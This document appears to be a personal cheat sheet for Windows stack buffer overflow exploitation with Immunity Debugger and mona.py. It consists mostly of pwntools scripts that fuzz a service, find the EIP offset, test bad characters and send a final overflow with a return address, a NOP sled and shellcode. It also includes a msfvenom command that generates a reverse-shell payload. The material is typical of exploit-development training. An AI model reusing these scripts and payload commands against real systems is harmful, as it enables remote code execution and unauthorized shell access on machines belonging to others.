# On windows

## Analyse with Immunity Debugger
Download: https://www.immunityinc.com/products/debugger/
Install mona.py: https://github.com/corelan/mona

### Setup mona
No need to use `-set workingfolder` if mona is installed in PyCommands folder of Immunity Debugger
```
!mona config
```

### Fuzz
#### Die on input length
Use following script to try inputs of increasing size
```python
#!/usr/bin/env python3
import time, sys
from pwn import *

prefix = ''
string = b'A' * 50

while True:
  try:
    print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
    nc = remote('127.0.0.1', 9999)
    nc.recvuntil(b'>> ')
    nc.write(string + b"\n")
    string += 50 * b'A'
    nc.close()
    time.sleep(1)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
```

Generate a more interesting payload of the length that was enough to make the program die
```sh
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l PAYLOAD_LENGTH
```

Fine grained detection of the length
```python
#!/usr/bin/env python3
import time, sys
from pwn import *

string = b'Aa0'

nc = remote('127.0.0.1', 9999)
nc.recvuntil(b'>> ')
nc.write(string + b"\n")
nc.close()

```

Use `!mona findmsp -distance PAYLOAD_LENGTH`.
Output of mona should show: `EIP contains normal pattern : ... (offset XXXX)`, note the offset.
If this line doesn't show, but `EBX(/EBP) contains normal pattern : ...`, note their offset a deduce EIP offset => Try EBP + 4

Confirm the offset, with following script, at crash EIP should be 42424242
```python
#!/usr/bin/env python3
import time, sys
from pwn import *

overflow = b'A' * 524
string = b'BBBB'

nc = remote('127.0.0.1', 9999)
nc.recvuntil(b'>> ')
nc.write(overflow + string + b"\n")
nc.close()
```

Find "bad characters".
P1: Generate bad chars
```python
found = ["00"]

for x in range(1, 256):
  if "{:02x}".format(x) not in found:
    print("\\x" + "{:02x}".format(x), end='')
print()
print()
print("!mona bytearray -b " + '"', end='')
for x in range(0, 256):
  if "{:02x}".format(x) in found:
    print("\\x" + "{:02x}".format(x), end='')
print('"', end='')
print()

# !mona bytearray -b "\x00"
# !mona compare -f bytearray.bin -a ESP_ADDR
```
P2: Test the payload
```python
#!/usr/bin/env python3
import time, sys
from pwn import *

overflow = b'A' * 524
string = b''

nc = remote('127.0.0.1', 9999)
nc.recvuntil(b'>> ')
nc.write(overflow + string + b"\n")
nc.close()
```

Find ESP addr
```bash
!mona jmp -r esp # check inside current program, might miss some jump in the DLL
# Check https://www.rcesecurity.com/2011/12/stack-manipulation-using-pop-ret/ for DLL
```

Generate exploit
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=12345 EXITFUNC=thread -b "\x00" -f py
```

Need NOP between overflow until EIP

Exploit
```python
#!/usr/bin/env python3
import time, sys
from pwn import *

overflow = b'A' * 146
returnAddr = b'\xc3\x14\x04\x08' # ESP jmp ADDR, care about Endianness
padding = b'\x90' * 20

# Cf msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=12345 EXITFUNC=thread -b "\x00" -f py
buf =  b""

nc = remote('127.0.0.1', 31337)
nc.write(overflow + returnAddr + padding + buf + b"\n")
nc.close()

# p32(0xdeadbeef)

```